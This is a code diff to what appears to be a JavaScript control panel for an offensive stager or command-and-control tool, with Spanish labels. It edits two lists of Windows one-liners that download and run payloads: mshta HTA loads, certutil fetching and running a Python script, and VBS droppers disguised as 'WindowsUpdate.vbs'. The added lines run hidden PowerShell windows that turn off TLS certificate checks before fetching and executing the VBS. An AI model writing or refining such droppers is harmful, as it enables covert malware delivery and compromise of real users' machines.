@@ -2861,8 +2861,8 @@ function svShowOneliners(token) {
       { label: 'mshta (HTA)',                cmd: `mshta ${hta_url}` },
       { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
       { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
-      { label: 'VBS — descarga (cmd.exe)',   cmd: `cmd /c "certutil -urlcache -split -f \\"${vbs_url}\\" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs"` },
-      { label: 'VBS — descarga (PowerShell)',cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
+      { label: 'VBS — WebClient (PS)',       cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('${vbs_url}','$env:TEMP\\WindowsUpdate.vbs');wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
+      { label: 'VBS — IWR (PS)',             cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};Invoke-WebRequest '${vbs_url}' -OutFile '$env:TEMP\\WindowsUpdate.vbs';wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
       { label: 'VBS — URL del archivo',      cmd: vbs_url },
     ]},
     { title: '🔐 PowerShell AES', items: [
@@ -5888,8 +5888,8 @@ function _stagerShowOneliners(token) {
         { label: 'mshta (HTA)',               cmd: `mshta ${hta_url}` },
         { label: 'certutil (cmd.exe)',         cmd: `cmd /c "certutil -urlcache -split -f \\"${url}\\" %TEMP%\\s.py & python %TEMP%\\s.py & del %TEMP%\\s.py"` },
         { label: 'certutil (PowerShell)',      cmd: `certutil -urlcache -split -f "${url}" $env:TEMP\\s.py; python $env:TEMP\\s.py; Remove-Item $env:TEMP\\s.py -Force -EA SilentlyContinue` },
-        { label: 'VBS — descarga (cmd.exe)',    cmd: `cmd /c "certutil -urlcache -split -f \\"${vbs_url}\\" %TEMP%\\WindowsUpdate.vbs & wscript %TEMP%\\WindowsUpdate.vbs"` },
-        { label: 'VBS — descarga (PowerShell)', cmd: `Invoke-WebRequest '${vbs_url}' -OutFile "$env:TEMP\\WindowsUpdate.vbs"; wscript "$env:TEMP\\WindowsUpdate.vbs"` },
+        { label: 'VBS — WebClient (PS)',        cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('${vbs_url}','$env:TEMP\\WindowsUpdate.vbs');wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
+        { label: 'VBS — IWR (PS)',              cmd: `powershell -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};Invoke-WebRequest '${vbs_url}' -OutFile '$env:TEMP\\WindowsUpdate.vbs';wscript '$env:TEMP\\WindowsUpdate.vbs'"` },
         { label: 'VBS — URL del archivo',       cmd: vbs_url },
       ]
     },
